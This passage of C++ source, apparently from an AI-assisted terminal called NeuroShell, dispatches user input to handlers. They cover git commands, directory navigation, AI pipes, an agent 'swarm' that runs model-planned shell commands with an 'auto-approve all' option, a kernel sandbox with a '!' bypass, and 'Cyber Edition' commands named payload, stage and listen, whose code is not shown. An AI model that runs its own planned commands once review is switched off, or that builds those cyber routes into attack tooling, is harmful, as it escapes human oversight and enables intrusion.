                for (const auto& s : polySuites) {
                    cmds.push_back(s.command);
                    labels.push_back(s.language);
                }
                taskSupervisor.RunParallel(cmds, labels);
                return;
            }

            std::string testCmd = neuroshell::TestOrchestrator::GetParallelTestCommand({}, fs::current_path());
            std::cout << "\n" << C_CYAN << "  🧪 Running Parallel Test Suite: " << C_BOLD << C_WHITE << testCmd << C_RESET << "\n\n";
            ExecuteCommand(testCmd);
            return;
        }

        // Repository viewer: slash commands, raw commands, and natural language intents
        if (lowerTrim == "/repos" || lowerTrim == "/repositories" || lowerTrim == "repos" ||
            lowerTrim == "my repos" || lowerTrim == "my github repos" || lowerTrim == "mine repos" ||
            lowerTrim == "show github repos" || lowerTrim == "show my repos" || lowerTrim == "show mine github repos" ||
            lowerTrim == "list github repos" || lowerTrim == "list my repos" || lowerTrim == "list mine github repos" ||
            lowerTrim == "get github repos" || lowerTrim == "view github repos" ||
            lowerTrim == "gh repo list" || lowerTrim.rfind("gh repo list ", 0) == 0) {
            HandleReposCommand();
            return;
        }
        if (lowerTrim == "/download" || lowerTrim.rfind("/download ", 0) == 0 ||
            lowerTrim == "download" || lowerTrim.rfind("download ", 0) == 0) {
            HandleDownloadCommand(input);
            return;
        }
        if (lowerTrim == "/scrape" || lowerTrim.rfind("/scrape ", 0) == 0 ||
            lowerTrim == "scrape" || lowerTrim.rfind("scrape ", 0) == 0) {
            HandleScrapeCommand(input);
            return;
        }
        if (lowerTrim == "/harvest" || lowerTrim.rfind("/harvest ", 0) == 0 ||
            lowerTrim == "harvest" || lowerTrim.rfind("harvest ", 0) == 0) {
            HandleHarvestCommand(input);
            return;
        }
        if (lowerTrim == "/arrange" || lowerTrim.rfind("/arrange ", 0) == 0 ||
            lowerTrim == "arrange" || lowerTrim.rfind("arrange ", 0) == 0) {
            HandleArrangeCommand(input);
            return;
        }
        if (lowerTrim == "/inspect" || lowerTrim.rfind("/inspect ", 0) == 0 ||
            lowerTrim == "inspect" || lowerTrim.rfind("inspect ", 0) == 0) {
            HandleInspectCommand(input);
            return;
        }
        if (lowerTrim == "/gh" || lowerTrim == "/github" || lowerTrim.rfind("/gh ", 0) == 0 || lowerTrim.rfind("/github ", 0) == 0) {
            HandleGitHubCommand(input);
            return;
        }
        if (lowerTrim == "install gh" || lowerTrim == "install github cli") {
            HandleGitHubCommand("/gh install");
            return;
        }
        if (lowerTrim.rfind("repos ", 0) == 0) {
            std::string userOrOrg = lowerTrim.substr(6);
            HandleReposCommand(userOrOrg);
            return;
        }
        if (lowerTrim.rfind("read ", 0) == 0 || lowerTrim.rfind("view ", 0) == 0) {
            std::string target = (lowerTrim.rfind("read ", 0) == 0) ? lowerTrim.substr(5) : lowerTrim.substr(5);
            HandleReadCommand(target);
            return;
        }
        if (lowerTrim == "audit" || lowerTrim.rfind("audit ", 0) == 0) {
            std::string target = (lowerTrim == "audit") ? "." : lowerTrim.substr(6);
            HandleAuditCommand(target);
            return;
        }
        if (lowerTrim.rfind("tree ", 0) == 0) {
            std::string target = lowerTrim.substr(5);
            HandleTreeCommand(target);
            return;
        }
        if (lowerTrim == "open" || lowerTrim.rfind("open ", 0) == 0 ||
            lowerTrim == "/open" || lowerTrim.rfind("/open ", 0) == 0) {
            std::string target = "";
            if (lowerTrim.rfind("open ", 0) == 0) target = input.substr(5);
            else if (lowerTrim.rfind("/open ", 0) == 0) target = input.substr(6);
            HandleUniversalOpenCommand(target);
            return;
        }

        if (lowerTrim == "uninstall" || lowerTrim.rfind("uninstall ", 0) == 0 ||
            lowerTrim == "/uninstall" || lowerTrim.rfind("/uninstall ", 0) == 0 ||
            lowerTrim.rfind("remove app ", 0) == 0 || lowerTrim.rfind("delete app ", 0) == 0) {
            HandleUninstallCommand(input);
            return;
        }

        if (lowerTrim == "delete" || lowerTrim.rfind("delete ", 0) == 0 ||
            lowerTrim == "/delete" || lowerTrim.rfind("/delete ", 0) == 0 ||
            lowerTrim == "trash" || lowerTrim.rfind("trash ", 0) == 0 ||
            lowerTrim.rfind("rm ", 0) == 0 || lowerTrim.rfind("remove ", 0) == 0) {
            HandleDeleteCommand(input);
            return;
        }

        if (lowerTrim == "run" || lowerTrim == "/run" ||
            lowerTrim.rfind("run ", 0) == 0 || lowerTrim.rfind("/run ", 0) == 0 ||
            lowerTrim.rfind("compile and run ", 0) == 0 || lowerTrim.rfind("compile ", 0) == 0) {
            HandleRunCodeCommand(input);
            return;
        }

        if (lowerTrim == "undo commit" || lowerTrim == "/undo commit" ||
            lowerTrim == "reverse commit" || lowerTrim == "undo last commit" ||
            lowerTrim == "reverse last commit") {
            std::cout << "\n  " << C_BOLD << C_CYAN << "⚡ Undoing Last Commit (Soft Reset — preserving all staged files)..." << C_RESET << "\n\n";
            ExecuteCommand("git reset --soft HEAD~1");
            return;
        }

        if (lowerTrim == "revert commit" || lowerTrim == "/revert commit" || lowerTrim == "revert last commit") {
            std::cout << "\n  " << C_BOLD << C_CYAN << "⚡ Creating Revert Commit for HEAD..." << C_RESET << "\n\n";
            ExecuteCommand("git revert --no-edit HEAD");
            return;
        }

        // ── Plain English Network Discovery ──
        if (lowerTrim.find("devices on my network") != std::string::npos ||
            lowerTrim.find("devices on my wifi") != std::string::npos ||
            lowerTrim.find("ip address") != std::string::npos && (lowerTrim.find("network") != std::string::npos || lowerTrim.find("wifi") != std::string::npos) ||
            lowerTrim.find("scan my local network") != std::string::npos) {
            std::cout << "\n  " << C_BOLD << C_CYAN << "⚡ Discovering Local Devices & IP Addresses (ARP Table)..." << C_RESET << "\n\n";
            ExecuteCommand("arp -a");
            return;
        }

        // ── NeuroShell Cyber Edition Direct Handlers ──
        if (lowerTrim == "mode cyber" || lowerTrim == "edition cyber" || lowerTrim == "cyber" ||
            lowerTrim == "mode standard" || lowerTrim == "edition standard" || lowerTrim == "standard" ||
            lowerTrim == "scope" || lowerTrim.rfind("scope ", 0) == 0 ||
            lowerTrim == "payload" || lowerTrim.rfind("payload ", 0) == 0 ||
            lowerTrim == "stage" || lowerTrim.rfind("stage ", 0) == 0 ||
            lowerTrim == "listen" || lowerTrim.rfind("listen ", 0) == 0) {
            HandleCyberCommand(input);
            return;
        }

        // ── Smart File & Folder Scaffolder: "mk", "new" ──
        if (lowerTrim == "mk" || lowerTrim.rfind("mk ", 0) == 0 || lowerTrim.rfind("new ", 0) == 0) {
            HandleMkCommand(input);
            return;
        }

        // 3. Smart Directory Jumper & Navigation Shortcuts

        // 3. Smart Directory Jumper & Navigation Shortcuts

        if (lowerTrim == ".." || lowerTrim == "..." || lowerTrim == "....") {
            fs::path cur = fs::current_path();
            jumper.SetLastDir(cur.string());

            fs::path dest = cur.parent_path();
            if (lowerTrim == "...") dest = dest.parent_path();
            else if (lowerTrim == "....") dest = dest.parent_path().parent_path();

            try {
                fs::current_path(dest);
                fs::path newCwd = fs::current_path();
                jumper.Record(newCwd.string());
                tabs[activeTabIdx].cwd = newCwd.string();
                tabs[activeTabIdx].name = newCwd.filename().string();
                std::cout << "  " << C_GREEN << "⚡ Moved up → " << C_BOLD << C_WHITE << newCwd.string() << C_RESET << "\n";
            } catch (...) {
                std::cout << "  " << C_RED << "❌ Cannot navigate above root directory." << C_RESET << "\n";
            }
            return;
        }

        if (lowerTrim == "back" || lowerTrim == "cd -" || lowerTrim == "z back" || lowerTrim == "z -") {
            std::string last = jumper.GetLastDir();
            if (!last.empty()) {
                fs::path cur = fs::current_path();
                jumper.SetLastDir(cur.string());

                try {
                    fs::current_path(last);
                    fs::path newCwd = fs::current_path();
                    tabs[activeTabIdx].cwd = newCwd.string();
                    tabs[activeTabIdx].name = newCwd.filename().string();
                    std::cout << "  " << C_GREEN << "⚡ Returned → " << C_BOLD << C_WHITE << newCwd.string() << C_RESET << "\n";
                } catch (...) {
                    std::cout << "  " << C_RED << "❌ Previous directory '" << last << "' is no longer accessible." << C_RESET << "\n";
                }
            } else {
                std::cout << "  " << C_MUTED << "No previous directory recorded in session." << C_RESET << "\n";
            }
            return;
        }

        if (lowerTrim == "z") {
            std::string currentCwd = fs::current_path().string();
            std::vector<std::string> avail = jumper.GetAvailableDirs(currentCwd);

            std::vector<MenuItem> dirItems;
            for (const auto& d : avail) {
                dirItems.push_back({fs::path(d).filename().string(), d, d});
            }

            int choice = SelectMenu("Quick Jump to Directory", dirItems, 0);
            if (choice >= 0) {
                jumper.SetLastDir(currentCwd);
                fs::current_path(dirItems[choice].id);
                fs::path newCwd = fs::current_path();
                jumper.Record(newCwd.string());
                tabs[activeTabIdx].cwd = newCwd.string();
                tabs[activeTabIdx].name = newCwd.filename().string();
                std::cout << "  " << C_GREEN << "⚡ Jumped → " << C_BOLD << C_WHITE << newCwd.string() << C_RESET << "\n";
            }
            return;
        }

        if (lowerTrim.rfind("f ", 0) == 0 || lowerTrim.rfind("find dir ", 0) == 0) {
            std::string query = (lowerTrim.rfind("f ", 0) == 0) ? input.substr(2) : input.substr(9);
            query.erase(0, query.find_first_not_of(" \t\r\n"));
            query.erase(query.find_last_not_of(" \t\r\n") + 1);

            std::string currentCwd = fs::current_path().string();
            std::vector<std::string> matches = jumper.DeepFind(query, currentCwd);

            if (matches.empty()) {
                std::cout << "  " << C_RED << "❌ No directory matching '" << query << "' found." << C_RESET << "\n";
                return;
            }

            std::vector<MenuItem> items;
            for (const auto& m : matches) {
                items.push_back({fs::path(m).filename().string(), m, m});
            }

            int choice = SelectMenu("Deep Folder Search: " + query, items, 0);
            if (choice >= 0) {
                jumper.SetLastDir(currentCwd);
                fs::current_path(items[choice].id);
                fs::path newCwd = fs::current_path();
                jumper.Record(newCwd.string());
                tabs[activeTabIdx].cwd = newCwd.string();
                tabs[activeTabIdx].name = newCwd.filename().string();
                std::cout << "  " << C_GREEN << "⚡ Jumped → " << C_BOLD << C_WHITE << newCwd.string() << C_RESET << "\n";
            }
            return;
        }

        if (lowerTrim.rfind("mark ", 0) == 0 || lowerTrim.rfind("bookmark ", 0) == 0) {
            std::string name = (lowerTrim.rfind("mark ", 0) == 0) ? input.substr(5) : input.substr(9);
            name.erase(0, name.find_first_not_of(" \t\r\n"));
            name.erase(name.find_last_not_of(" \t\r\n") + 1);

            std::string currentCwd = fs::current_path().string();
            jumper.SetBookmark(name, currentCwd);
            std::cout << "  " << C_GREEN << "🔖 Bookmarked '" << C_BOLD << name << C_RESET << C_GREEN << "' → " << currentCwd << C_RESET << "\n";
            return;
        }

        if (lowerTrim.rfind("bm ", 0) == 0 || lowerTrim == "bookmarks") {
            if (lowerTrim == "bookmarks") {
                const auto& bms = jumper.GetBookmarks();
                if (bms.empty()) {
                    std::cout << "  " << C_MUTED << "No bookmarks saved yet. Use 'mark <name>' to save current folder." << C_RESET << "\n";
                } else {
                    std::cout << "\n" << C_CYAN << "  📚 Saved Folder Bookmarks:\n" << C_RESET;
                    for (const auto& [k, v] : bms) {
                        std::cout << "  " << C_MAGENTA << k << C_RESET << " → " << C_WHITE << v << C_RESET << "\n";
                    }
                    std::cout << "\n";
                }
                return;
            }
            std::string name = input.substr(3);
            name.erase(0, name.find_first_not_of(" \t\r\n"));
            name.erase(name.find_last_not_of(" \t\r\n") + 1);
            std::string target = jumper.GetBookmark(name);
            if (!target.empty()) {
                std::string currentCwd = fs::current_path().string();
                jumper.SetLastDir(currentCwd);
                fs::current_path(target);
                fs::path newCwd = fs::current_path();
                jumper.Record(newCwd.string());
                tabs[activeTabIdx].cwd = newCwd.string();
                tabs[activeTabIdx].name = newCwd.filename().string();
                std::cout << "  " << C_GREEN << "⚡ Teleported to '" << name << "' → " << C_BOLD << C_WHITE << newCwd.string() << C_RESET << "\n";
            } else {
                std::cout << "  " << C_RED << "❌ Bookmark '" << name << "' not found. Type 'bookmarks' to view list." << C_RESET << "\n";
            }
            return;
        }

        bool isJumpCmd = false;
        std::string jumpQuery = "";
        if (lowerTrim.rfind("z ", 0) == 0) {
            isJumpCmd = true;
            jumpQuery = input.substr(2);
        } else if (lowerTrim.rfind("goto ", 0) == 0 || lowerTrim.rfind("go to ", 0) == 0) {
            isJumpCmd = true;
            jumpQuery = (lowerTrim.rfind("goto ", 0) == 0) ? input.substr(5) : input.substr(6);
        } else if (lowerTrim.rfind("jump to ", 0) == 0) {
            isJumpCmd = true;
            jumpQuery = input.substr(8);
        }

        if (isJumpCmd) {
            jumpQuery.erase(0, jumpQuery.find_first_not_of(" \t\r\n\"'"));
            jumpQuery.erase(jumpQuery.find_last_not_of(" \t\r\n\"'") + 1);

            std::string currentCwd = fs::current_path().string();
            std::string dest = jumper.Jump(jumpQuery, currentCwd);

            if (!dest.empty()) {
                jumper.SetLastDir(currentCwd);
                try {
                    fs::current_path(dest);
                    fs::path newCwd = fs::current_path();
                    jumper.Record(newCwd.string());
                    tabs[activeTabIdx].cwd = newCwd.string();
                    tabs[activeTabIdx].name = newCwd.filename().string();
                    std::cout << "  " << C_GREEN << "⚡ Jumped → " << C_BOLD << C_WHITE << newCwd.string() << C_RESET << "\n";
                } catch (...) {
                    std::cout << "  " << C_RED << "❌ Failed to change directory to: " << dest << C_RESET << "\n";
                }
                return;
            } else {
                std::cout << "  " << C_RED << "❌ Directory matching '" << jumpQuery << "' not found." << C_RESET << "\n";
                return;
            }
        }

        if (input.rfind("cd ", 0) == 0 || input == "cd") {
            std::string target = (input.length() > 3) ? input.substr(3) : "";
            target.erase(0, target.find_first_not_of(" \t\r\n\"'"));
            target.erase(target.find_last_not_of(" \t\r\n\"'") + 1);

            std::string prevCwd = fs::current_path().string();
            jumper.SetLastDir(prevCwd);

            if (target.empty() || target == "~") {
                fs::current_path(PlatformFS::GetHomeDir());
            } else if (target == "-" || target == "back") {
                std::string last = jumper.GetLastDir();
                if (!last.empty()) {
                    try {
                        fs::current_path(last);
                        std::cout << "  " << C_GREEN << "⚡ Returned → " << C_BOLD << C_WHITE << last << C_RESET << "\n";
                    } catch (...) {
                        std::cout << "  " << C_RED << "❌ Previous directory not accessible." << C_RESET << "\n";
                    }
                } else {
                    std::cout << "  " << C_MUTED << "No previous directory recorded in session." << C_RESET << "\n";
                }
            } else if (target == "...") {
                try { fs::current_path(fs::path(prevCwd).parent_path().parent_path()); } catch (...) {}
            } else if (target == "....") {
                try { fs::current_path(fs::path(prevCwd).parent_path().parent_path().parent_path()); } catch (...) {}
            } else {
                bool moved = false;
                try {
                    if (fs::exists(target) && fs::is_directory(target)) {
                        fs::current_path(target);
                        moved = true;
                    }
                } catch (...) {}

                if (!moved) {
                    // Try smart jumping for loose names (e.g. cd desktop, cd ira)
                    std::string smartDest = jumper.Jump(target, prevCwd);
                    if (!smartDest.empty()) {
                        try {
                            fs::current_path(smartDest);
                            moved = true;
                            std::cout << "  " << C_GREEN << "⚡ Smart Jumped → " << C_BOLD << C_WHITE << smartDest << C_RESET << "\n";
                        } catch (...) {}
                    }
                }

                if (!moved) {
                    std::cout << "  " << C_RED << "❌ Directory error: Path '" << target << "' not found." << C_RESET << "\n";
                }
            }
            fs::path newCwd = fs::current_path();
            jumper.Record(newCwd.string());
            tabs[activeTabIdx].cwd = newCwd.string();
            tabs[activeTabIdx].name = newCwd.filename().string();
            return;
        }

        // 4. Slash Commands
        if (input[0] == '/') {
            HandleSlashCommand(input);
            return;
        }

        // 4.5. AI Command Pipings (| @ai, | @fix, | @explain, | @agent)
        size_t pipePos = input.find('|');
        if (pipePos != std::string::npos) {
            std::string rhs = input.substr(pipePos + 1);
            size_t s = rhs.find_first_not_of(" \t");
            if (s != std::string::npos) {
                rhs = rhs.substr(s);
                std::string upstream = input.substr(0, pipePos);
                size_t ue = upstream.find_last_not_of(" \t");
                if (ue != std::string::npos) upstream = upstream.substr(0, ue + 1);

                if (rhs.rfind("@table", 0) == 0 || rhs.rfind("@json", 0) == 0 ||
                    rhs.rfind("@inspect", 0) == 0 || rhs.rfind("@arrange", 0) == 0) {
                    std::string directive = "@table";
                    if (rhs.rfind("@json", 0) == 0) directive = "@json";
                    else if (rhs.rfind("@inspect", 0) == 0) directive = "@inspect";
                    else if (rhs.rfind("@arrange", 0) == 0) directive = "@arrange";

                    std::cout << "  " << C_MAGENTA << "⚡ Executing upstream pipeline: " << C_WHITE << upstream << C_RESET << "\n";
                    PlatformProcessRunner::ExecResult upRes = PlatformProcessRunner::Execute(upstream);
                    std::cout << "\n";
                    HandlePipedTransform(directive, upRes.output);
                    return;
                }
                else if (rhs.rfind("@ai", 0) == 0 || rhs.rfind("@fix", 0) == 0 ||
                    rhs.rfind("@explain", 0) == 0 || rhs.rfind("@agent", 0) == 0) {
                    
                    std::string directive = "@ai";
                    std::string prompt = "";
                    size_t sp = rhs.find(' ');
                    if (sp != std::string::npos) {
                        directive = rhs.substr(0, sp);
                        prompt = rhs.substr(sp + 1);
                    } else {
                        directive = rhs;
                    }

                    std::cout << "  " << C_MAGENTA << "⚡ Executing upstream pipeline: " << C_WHITE << upstream << C_RESET << "\n";
                    PlatformProcessRunner::ExecResult upRes = PlatformProcessRunner::Execute(upstream);
                    
                    std::cout << "\n  " << C_CYAN << "⌬ NeuroAI (" << directive << " Reasoning):" << C_RESET
                              << C_MUTED << "  [Esc to cancel]" << C_RESET << "\n";
                    RunStreamedAIPipe(directive, prompt, upRes.output);
                    return;
                }
            }
        }

        // 4.6. Autonomous Agent / Swarm Tasks (@agent "...", @swarm "...")
        if (lowerTrim.rfind("@agent", 0) == 0 || lowerTrim.rfind("@swarm", 0) == 0 ||
            lowerTrim.rfind("/agent", 0) == 0 || lowerTrim.rfind("/swarm", 0) == 0) {
            
            std::string task = input;
            size_t sp = task.find(' ');
            if (sp != std::string::npos) {
                task = task.substr(sp + 1);
            } else {
                task = "Inspect repository and report health";
            }
            task.erase(0, task.find_first_not_of(" \t\r\n\"'"));
            task.erase(task.find_last_not_of(" \t\r\n\"'") + 1);

            std::cout << "\n  " << C_MAGENTA << "⌬ NeuroShell Autonomous Swarm" << C_RESET << "\n";
            std::cout << "  " << C_MUTED << "Task: " << C_WHITE << task << C_RESET << "\n";
            std::cout << "  " << C_MUTED << "Synthesizing multi-step execution plan..." << C_RESET << "\n\n";

            NeuroShell::IPC::AgentPlanResult plan = ipcClient.CreateAgentPlan(task, fs::current_path().string());
            if (!plan.success || plan.steps.empty()) {
                std::cout << "  " << C_RED << "❌ Unable to generate swarm plan." << C_RESET << "\n";
                return;
            }

            std::cout << "  " << C_CYAN << "╭── ⌬ Swarm Orchestration Plan (" << plan.steps.size() << " Steps) ─────────────────────────╮" << C_RESET << "\n";
            for (const auto& step : plan.steps) {
                std::cout << "  " << C_CYAN << "│ " << C_WHITE << step.order << ". [⬜ PENDING] " << step.description << C_RESET << "\n";
                std::cout << "  " << C_CYAN << "│    ❯ " << C_YELLOW << step.command << C_RESET << "\n";
            }
            std::cout << "  " << C_CYAN << "╰──────────────────────────────────────────────────────────────────╯" << C_RESET << "\n\n";

            bool autoApproveAll = false;
            for (size_t i = 0; i < plan.steps.size(); ++i) {
                const auto& step = plan.steps[i];
                std::cout << "  " << C_MAGENTA << "Step " << step.order << "/" << plan.steps.size() << ": " << C_WHITE << step.description << C_RESET << "\n";
                std::cout << "  " << C_CYAN << "Command: " << C_BOLD << C_WHITE << step.command << C_RESET << "\n";

                if (!autoApproveAll) {
                    std::cout << "  " << C_YELLOW << "[y] Approve & Run   [n] Skip   [a] Auto-Approve All   [q] Abort: " << C_RESET;
                    KeyEvent k = terminal.ReadKey();
                    std::cout << k.ch << "\n\n";

                    if (k.ch == 'q' || k.ch == 'Q') {
                        std::cout << "  " << C_RED << "🛑 Agent workflow aborted by user." << C_RESET << "\n\n";
                        return;
                    }
                    if (k.ch == 'n' || k.ch == 'N') {
                        std::cout << "  " << C_MUTED << "⏭️ Skipped step " << step.order << C_RESET << "\n\n";
                        continue;
                    }
                    if (k.ch == 'a' || k.ch == 'A') {
                        autoApproveAll = true;
                    }
                }

                std::cout << "  " << C_GREEN << "⚡ [🔄 RUNNING] " << step.command << C_RESET << "\n";
                PlatformProcessRunner::ExecResult stepRes = PlatformProcessRunner::Execute(step.command);
                if (stepRes.exitCode == 0) {
                    std::cout << "  " << C_GREEN << "✅ [COMPLETED] Step " << step.order << " succeeded." << C_RESET << "\n\n";
                } else {
                    std::cout << "  " << C_RED << "❌ [FAILED] Step " << step.order << " exited with code " << stepRes.exitCode << C_RESET << "\n\n";
                    if (!autoApproveAll) {
                        std::cout << "  " << C_YELLOW << "Continue to next step? [y/N]: " << C_RESET;
                        KeyEvent contKey = terminal.ReadKey();
                        std::cout << contKey.ch << "\n\n";
                        if (contKey.ch != 'y' && contKey.ch != 'Y') break;
                    }
                }
            }
            std::cout << "  " << C_GREEN << "✨ Swarm task execution finished." << C_RESET << "\n\n";
            return;
        }

        // 4.9. Sandbox escalation (Phase 8, v5.16): `!command` runs one
        // command unconfined — explicit user intent, mirroring sudo
        // ergonomics. The bang is stripped before translation/analysis.
        bool sandboxEscalated = false;
        std::string effectiveInput = input;
        if (effectiveInput.size() > 1 && effectiveInput[0] == '!' &&
            effectiveInput[1] != '!' && effectiveInput[1] != '=') {
            sandboxEscalated = true;
            effectiveInput = effectiveInput.substr(1);
            effectiveInput.erase(0, effectiveInput.find_first_not_of(" \t"));
            if (effectiveInput.empty()) return;
        }

        // 5. Natural Language Command Translation
        std::string transformed = "";
        std::string commandToRun = effectiveInput;
        bool wasAiTranslated = false;

        if (IsNaturalLanguageQuery(effectiveInput)) {
            std::cout << "  " << C_MAGENTA << "⌬ Translating: " << C_WHITE << "'" << effectiveInput << "'..." << C_RESET << "\n";
            transformed = TranslateNaturalLanguage(effectiveInput);
            if (!transformed.empty()) {
                std::cout << "  " << C_GREEN << "✔ Transformed → " << C_BOLD << C_WHITE << transformed << C_RESET << "\n\n";
                commandToRun = transformed;
                wasAiTranslated = true;
            } else {
                std::cout << "  " << C_YELLOW << "⚠ AI Model could not resolve this intent into a shell command." << C_RESET << "\n";
                std::cout << "  " << C_MUTED << "Tip: Try rephrasing or verify model status using /status." << C_RESET << "\n\n";
                return;
            }
        }

        // 5.5. Blast-Radius Preview (Phase 4, v5.12): before anything
        // destructive runs, show exactly what it would touch and require
        // explicit confirmation for MEDIUM+ severity. Non-destructive
        // commands pass through with zero friction.
        if (!BlastRadiusGate(commandToRun)) {
            std::cout << "  " << C_YELLOW << "◼ Command aborted — nothing was executed." << C_RESET << "\n\n";
            return;
        }

        // 5.8. Kernel sandbox decision (Phase 8, v5.16). In `project`
        // mode only AI-translated commands are confined (the untrusted
        // input path); `strict` confines everything; `!cmd` escalates.
        neuroshell::PreparedSandbox preparedSbx;
        const neuroshell::PreparedSandbox* sbxPtr = nullptr;
        if (neuroshell::ShouldSandbox(sandboxMode, wasAiTranslated, sandboxEscalated)) {
            neuroshell::SandboxSpec spec;
            spec.enabled = true;
            spec.project_dir = tabs[activeTabIdx].cwd;
            spec.rw_paths.push_back("/tmp");
            spec.rw_paths.push_back((PlatformFS::GetHomeDir() / ".neuroshell").string());
            preparedSbx = neuroshell::PreparedSandbox::Prepare(spec);
            if (preparedSbx.landlock_available) {
                sbxPtr = &preparedSbx;
                std::cout << "  " << C_MUTED << "⛨ kernel sandbox: writes confined to "
                          << tabs[activeTabIdx].cwd << " (Landlock ABI "
                          << preparedSbx.landlock_abi << ") — prefix '!' to escalate"
                          << C_RESET << "\n";
            } else {
#if !defined(_WIN32)
                std::cout << "  " << C_YELLOW << "⛨ kernel sandbox unavailable on this "
                          << "system — running unconfined (blast-radius heuristics "
                          << "still active)." << C_RESET << "\n";
#endif
            }
        }

        // 6. Cross-Platform Process Runner — DLP masking is applied as a live
        // line filter so secrets never reach the viewport unredacted
        // (previously raw output was displayed and only the record was masked).
        PlatformProcessRunner::ExecResult execRes = PlatformProcessRunner::Execute(
            commandToRun,
            [this](const std::string& line) { return dlpMasker.filter_stream(line); },
            sbxPtr);

        // Sandbox application failure surfaces as exit 90+step (fail-closed).
        if (sbxPtr && execRes.exitCode >= 90 + neuroshell::SBX_ERR_NNP &&
            execRes.exitCode <= 90 + neuroshell::SBX_ERR_UNSUPPORTED) {
            std::cout << "  " << C_RED << "✘ Kernel sandbox could not be applied ("
                      << neuroshell::SandboxStepName(execRes.exitCode - 90)
                      << ") — command was NOT executed. Use '!" << commandToRun
                      << "' to run unconfined." << C_RESET << "\n\n";
            return;
        }

        streamRecorder.record_input(commandToRun);
        streamRecorder.record_output(execRes.output);
        shmRing.write_message("{\"event\":\"command_executed\",\"cmd\":\"" + commandToRun + "\"}");

        // Smart Error Shield (Local Pattern + Python AST / LLM Diagnosis via IPC)
        if (execRes.exitCode != 0) {
            SmartErrorShield::ErrorReport errRep = errorShield.Analyze(execRes.output, execRes.exitCode, commandToRun);
            if (!errRep.hasError || errRep.autoFixCmd.empty()) {
                // Query Python IPC Error Diagnoser
                NeuroShell::IPC::DiagnosticResult diag = ipcClient.DiagnoseError(commandToRun, execRes.output, execRes.exitCode, fs::current_path().string());
                if (diag.success && !diag.auto_fix.empty()) {
                    errRep.hasError = true;
                    errRep.category = diag.category;
                    errRep.detail = diag.root_cause;
                    errRep.autoFixCmd = diag.auto_fix;
                }
            }

            if (errRep.hasError) {
                errorShield.RenderErrorCard(errRep);

                if (!errRep.autoFixCmd.empty() && isInteractive) {
                    KeyEvent keyEv = terminal.ReadKey();
                    if (keyEv.ch == 'y' || keyEv.ch == 'Y') {
                        std::cout << "  " << C_GREEN << "⚡ Applying Auto-Fix: " << C_BOLD << C_WHITE << errRep.autoFixCmd << C_RESET << "\n\n";
                        ExecuteCommand(errRep.autoFixCmd, isInteractive);
                    }
                }
            }
        }
    }

    void Run() {
        PrintBanner();

        while (!shouldExit) {
            RenderTabBar();

            std::string cwd = fs::current_path().string();
            std::string branch = GetGitBranch();
            std::string branchTag = branch.empty() ? "" : (" (" + std::string(C_MAGENTA) + branch + std::string(C_MUTED) + ")");
            std::string promptColor = isCyberEdition ? C_GREEN : C_CYAN;
            std::string editionTag = isCyberEdition ? (std::string(C_BOLD) + C_GREEN + "[CYBER] " + C_RESET) : "";
            std::string prompt = std::string(promptColor) + "⌬ " + editionTag + C_MUTED + cwd + branchTag + " " + std::string(promptColor) + "❯" + C_RESET + " ";
            std::string input = ReadLine(prompt);

            size_t start = input.find_first_not_of(" \t\r\n");
            if (start == std::string::npos) continue;
            input = input.substr(start);
            input.erase(input.find_last_not_of(" \t\r\n") + 1);

            ExecuteCommand(input);
            std::cout << "\n";
        }

        // Deterministic teardown before destructors run.
        taskSupervisor.StopAll();
        std::cout << C_MUTED << "  Goodbye — session state saved.\n" << C_RESET;
    }
};

// ═══════════════════════════════════════════════════════════
// Pure Async-Signal-Safe Crash Filter (Windows & POSIX)
// ═══════════════════════════════════════════════════════════

#if defined(NEUROSHELL_PLATFORM_WINDOWS)
LONG WINAPI NeuroShellWin32CrashFilter(EXCEPTION_POINTERS* ep) {
    wchar_t dumpPath[MAX_PATH];
    DWORD len = GetEnvironmentVariableW(L"USERPROFILE", dumpPath, MAX_PATH);
    if (len > 0 && len < MAX_PATH) {
        wcscat_s(dumpPath, MAX_PATH, L"\\.neuroshell\\crash.log");
    } else {
        wcscpy_s(dumpPath, MAX_PATH, L"neuroshell_crash.log");
    }

    HANDLE hFile = CreateFileW(dumpPath, FILE_APPEND_DATA, FILE_SHARE_READ,
                               NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        char buf[256];
        int bytes = wsprintfA(buf, "=== CRASH EVENT (Win32) ===\r\nExceptionCode: 0x%08X\r\nAddress: 0x%p\r\n\r\n",
                              ep->ExceptionRecord->ExceptionCode,
                              ep->ExceptionRecord->ExceptionAddress);
        DWORD written = 0;
        WriteFile(hFile, buf, bytes, &written, NULL);
        CloseHandle(hFile);
    }

    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    if (hOut != INVALID_HANDLE_VALUE) {
        const char msg[] = "\r\n\033[?2004l\033[?25h\033[0m\r\n\033[1;31m[!] NeuroShell Fatal Exception Intercepted. State restored.\033[0m\r\n";
        DWORD written = 0;
        WriteFile(hOut, msg, (DWORD)strlen(msg), &written, NULL);
    }
    return EXCEPTION_EXECUTE_HANDLER;
}
#else
void NeuroShellPosixSignalHandler(int sig, siginfo_t* info, void* /*ucontext*/) {
    const char* home = getenv("HOME");
    char pathBuf[1024];
    if (home) snprintf(pathBuf, sizeof(pathBuf), "%s/.neuroshell/crash.log", home);
    else snprintf(pathBuf, sizeof(pathBuf), "neuroshell_crash.log");

    int fd = open(pathBuf, O_WRONLY | O_CREAT | O_APPEND, 0600);
    if (fd >= 0) {
        char buf[256];
        int bytes = snprintf(buf, sizeof(buf), "=== CRASH EVENT (POSIX) ===\nSignal: %d\nFault Address: %p\n\n",
                             sig, info ? info->si_addr : nullptr);
        ssize_t wr = write(fd, buf, bytes);
        (void)wr; // async-signal-safe context: best-effort only
        close(fd);
    }

    const char msg[] = "\r\n\033[?2004l\033[?25h\033[0m\r\n\033[1;31m[!] NeuroShell Fatal Signal Intercepted. State restored.\033[0m\r\n";
    ssize_t wr2 = write(STDERR_FILENO, msg, strlen(msg));
    (void)wr2;
    _exit(128 + sig);
}
#endif

int main(int argc, char* argv[]) {
    bool cyberMode = false;
    for (int i = 1; i < argc; ++i) {
        std::string a = argv[i];
        if (a == "--cyber" || a == "-cyber") {
            cyberMode = true;
        }
    }

    if (argc >= 2) {
        std::string arg1 = argv[1];
        if (arg1 == "--version" || arg1 == "-v" || arg1 == "version") {
            std::cout << "NeuroShell v" << NEUROSHELL_VERSION << " (Enterprise Cross-Platform Edition)\n";
            std::cout << "Copyright (c) 2024-2026 Abneesh Singh. All rights reserved.\n";
            return 0;
        }
        if ((arg1 == "-c" || arg1 == "--command" || arg1 == "/c") && argc >= 3) {
            std::string cmd = argv[2];
